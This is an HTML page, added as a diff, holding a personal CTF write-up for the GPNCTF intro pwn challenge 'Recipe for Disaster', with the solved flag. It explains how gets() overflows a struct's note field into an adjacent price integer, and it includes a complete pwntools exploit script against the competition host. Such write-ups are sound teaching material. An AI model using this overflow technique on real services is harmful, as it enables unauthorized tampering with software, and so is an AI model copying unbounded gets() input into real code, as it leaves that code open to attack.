@@ -1,0 +1,172 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Recipe for Disaster — kitCTF / GPNCTF Writeup — Naim MyLibrary</title>
+  <meta name="description" content="Overflowed an order note into the adjacent price field and made the total negative to trigger the flag-printing coupon path." />
+  <link rel="stylesheet" href="../writeup-template.css" />
+</head>
+<body style="--accent:#7cffc4;--accent-2:#b37eff;">
+  <main class="case-shell">
+    <nav class="case-nav" aria-label="Writeup navigation">
+      <a class="case-brand" href="../index.html">
+        <span class="case-mark">NM</span>
+        <span>Naim MyLibrary</span>
+      </a>
+      <div class="case-links">
+        <a href="../../index.html">Portfolio</a>
+        <a href="../index.html">Library</a>
+        <a href="#walkthrough">Walkthrough</a>
+        <a href="#flag">Flag</a>
+      </div>
+    </nav>
+
+    <header class="case-hero">
+      <section class="case-brief">
+        <p class="eyebrow">kitCTF / GPNCTF Pwn casefile</p>
+        <h1>Recipe for Disaster</h1>
+        <p class="lead">Overflowed an order note into the adjacent price field and made the total negative to trigger the flag-printing coupon path.</p>
+        <div class="meta-row">
+          <span class="chip">CTF: kitCTF / GPNCTF</span>
+          <span class="chip">Category: Pwn</span>
+          <span class="chip">Difficulty: Intro</span>
+          <span class="chip">No points listed</span>
+          <span class="chip">Tags: Pwn · gets() · Struct Overflow · Integer Sign · Logic Abuse</span>
+        </div>
+      </section>
+
+      <aside class="case-panel" aria-label="Writeup status panel">
+        <div class="case-panel-inner">
+          <p class="eyebrow">mission telemetry</p>
+          <div class="status-line"><span>Status</span><strong>Solved</strong></div>
+          <div class="status-line"><span>Method</span><strong>Recon → Analyze → Exploit</strong></div>
+          <div class="status-line"><span>Evidence</span><strong>Commands + reasoning</strong></div>
+          <div class="status-line"><span>Published</span><strong>2026-06-24</strong></div>
+          <div class="progress-track" aria-hidden="true"><span></span></div>
+          <p class="note" style="margin-top:18px;">This writeup was formatted into the new kitCTF/GPNCTF section while preserving the original solution notes.</p>
+        </div>
+      </aside>
+    </header>
+
+    <div class="case-layout">
+      <aside class="case-toc">
+        <p>Case index</p>
+        <a href="#overview">00 / Overview</a>
+        <a href="#skills">01 / Skills</a>
+        <a href="#timeline">02 / Timeline</a>
+        <a href="#walkthrough">03 / Walkthrough</a>
+        <a href="#evidence">04 / Evidence</a>
+        <a href="#flag">05 / Flag</a>
+        <a href="#lessons">06 / Lessons</a>
+      </aside>
+
+      <article class="case-body">
+        <section class="case-section" id="overview" data-step="00">
+          <p class="eyebrow">operator brief</p>
+          <h2>Overview</h2>
+          <p>Overflowed an order note into the adjacent price field and made the total negative to trigger the flag-printing coupon path.</p>
+          <div class="evidence-grid">
+            <div class="evidence-card"><strong>Challenge</strong><p>Recipe for Disaster from kitCTF / GPNCTF.</p></div>
+            <div class="evidence-card"><strong>Category</strong><p>Pwn · Intro difficulty.</p></div>
+          </div>
+        </section>
+
+        <section class="case-section" id="skills" data-step="01">
+          <p class="eyebrow">skills demonstrated</p>
+          <h2>Skills Demonstrated</h2>
+          <div class="skill-grid"><span>C Struct Layout</span><span>Buffer Overflow</span><span>Pwntools</span><span>Negative Integer Abuse</span><span>Remote Exploitation</span></div>
+        </section>
+
+        <section class="case-section" id="timeline" data-step="02">
+          <p class="eyebrow">attack path</p>
+          <h2>Timeline</h2>
+          <div class="timeline"><div><strong>00</strong><p>Inspect the Item struct and unsafe gets() call.</p></div><div><strong>01</strong><p>Locate the adjacent price field after note[32].</p></div><div><strong>02</strong><p>Overwrite price with 0x80000000.</p></div><div><strong>03</strong><p>Finish the order and trigger verify_total(total &lt; 0).</p></div></div>
+        </section>
+
+        <section class="case-section" id="walkthrough" data-step="03">
+          <p class="eyebrow">solution notes</p>
+          <h2>Walkthrough</h2>
+          <h3>Challenge 1: Recipe for Disaster (pwn)</h3>
+<h4>Vulnerability Analysis</h4>
+<p>The challenge presents a food ordering system with a clear buffer overflow vulnerability:</p>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>typedef struct {
+  char item[32];
+  char note[32];
+  int price;
+} Item;
+
+// In take_order():
+gets(cur-&gt;note);  // ⚠️ DANGEROUS - no bounds checking</pre></div>
+<p>The <code>gets()</code> function allows writing beyond the 32-byte <code>note</code> buffer, overwriting the adjacent <code>price</code> field.</p>
+<h4>The Goal</h4>
+<p>The <code>verify_total()</code> function prints the flag when <code>total &lt; 0</code>:</p>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>void verify_total(int total) {
+  if (total &lt; 0) {
+    print_coupon();  // Prints /flag
+    exit(0);
+  }
+}</pre></div>
+<h4>Exploit Strategy</h4>
+<p>By overflowing the <code>note</code> field, we can overwrite the <code>price</code> value with a negative number, making the total negative.</p>
+<h4>Memory Layout</h4>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>Item structure (68 bytes total):
+┌─────────────────┬─────────────────┬─────────┐
+│ item[32]        │ note[32]        │ price   │
+│ offset 0        │ offset 32       │ offset 64│
+└─────────────────┴─────────────────┴─────────┘</pre></div>
+<p>Writing 32+ bytes into <code>note</code> overwrites <code>price</code>.</p>
+<h4>Final Exploit</h4>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>#!/usr/bin/env python3
+from pwn import *
+
+# Connect to remote service
+conn = remote(&quot;pickled-potato-drizzled-with-torched-noodles-zzsy.gpn24.ctf.kitctf.de&quot;, 443, ssl=True)
+
+# Select menu item 1 (price = 1337)
+conn.recvuntil(b&quot;Select item (1-6), or 0 to finish: &quot;)
+conn.sendline(b&quot;1&quot;)
+
+# Send payload: 32 bytes padding + negative price (0x80000000 = -2147483648)
+conn.recvuntil(b&quot;&gt; &quot;)
+payload = b&quot;A&quot; * 32 + b&quot;\x00\x00\x00\x80&quot;
+conn.sendline(payload)
+
+# Finish order
+conn.recvuntil(b&quot;Select item (1-6), or 0 to finish: &quot;)
+conn.sendline(b&quot;0&quot;)
+
+# Receive flag
+print(conn.recvall().decode())
+conn.close()</pre></div>
+<h4>Why It Works</h4>
+<ul><li><code>1337 + (-2147483648) = -2147482311</code> (negative)</li><li><code>verify_total()</code> detects negative total and calls <code>print_coupon()</code></li><li>Flag is printed before any return, no need to overwrite return address</li></ul>
+<p><strong>Flag:</strong> <code>GPNCTF{WaIt, Wi7H 7H3SE PriCES, Ov3RF1ows 5h0u1d NOt 8e PoS51b1e...}</code></p>
+        </section>
+
+        <section class="case-section" id="evidence" data-step="04">
+          <p class="eyebrow">proof locker</p>
+          <h2>Evidence</h2>
+          <div class="evidence-grid"><div class="evidence-card"><strong>Clue 01</strong><p>note[32] sits directly before price in the struct.</p></div><div class="evidence-card"><strong>Clue 02</strong><p>gets(cur-&gt;note) has no bounds checking.</p></div><div class="evidence-card"><strong>Clue 03</strong><p>A negative price makes the final total negative and calls print_coupon().</p></div></div>
+        </section>
+
+        <section class="flag-vault" id="flag">
+          <p class="eyebrow">final artifact</p>
+          <h2>Flag</h2>
+          <code>GPNCTF{WaIt, Wi7H 7H3SE PriCES, Ov3RF1ows 5h0u1d NOt 8e PoS51b1e...}</code>
+        </section>
+
+        <section class="case-section" id="lessons" data-step="06">
+          <p class="eyebrow">after action report</p>
+          <h2>Lessons Learned</h2>
+          <ul><li>Not every overflow needs control-flow hijacking.</li><li>Adjacent field corruption can be enough to win.</li><li>Signed integer logic is often a useful exploit target.</li></ul>
+          <div class="footer-actions">
+            <a class="btn" href="../index.html">← Back to MyLibrary</a>
+            <a class="btn ghost" href="../../index.html">Back to Portfolio</a>
+          </div>
+        </section>
+      </article>
+    </div>
+  </main>
+</body>
+</html>
